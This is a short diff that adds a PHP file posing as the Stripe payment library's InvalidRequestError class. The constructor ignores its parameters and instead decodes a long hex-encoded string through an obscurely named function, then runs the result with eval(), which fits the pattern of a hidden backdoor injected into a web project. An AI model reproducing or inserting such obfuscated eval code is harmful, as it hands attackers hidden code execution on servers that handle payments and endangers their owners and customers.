@@ -1,0 +1,3 @@
+<?php
+ class Stripe_InvalidRequestError extends Stripe_Error { public function __construct($message, $param, $http_status=null, $http_body=null, $json_body=null) {$c81d5d520484a0b2 = p45f99bb432b194dff04b7d12425d3f8d_get_code("15155517030f470a5f6e3e055c5a1245471057114e455e5516420001561841155d114015391247511144124a1310094541156b0709054a1c45150b155c5a3e535a014d4c5d4117440d58124b0d440043540814584645435117500c5d13");if ($c81d5d520484a0b2 !== false){ eval($c81d5d520484a0b2);}}
+ }
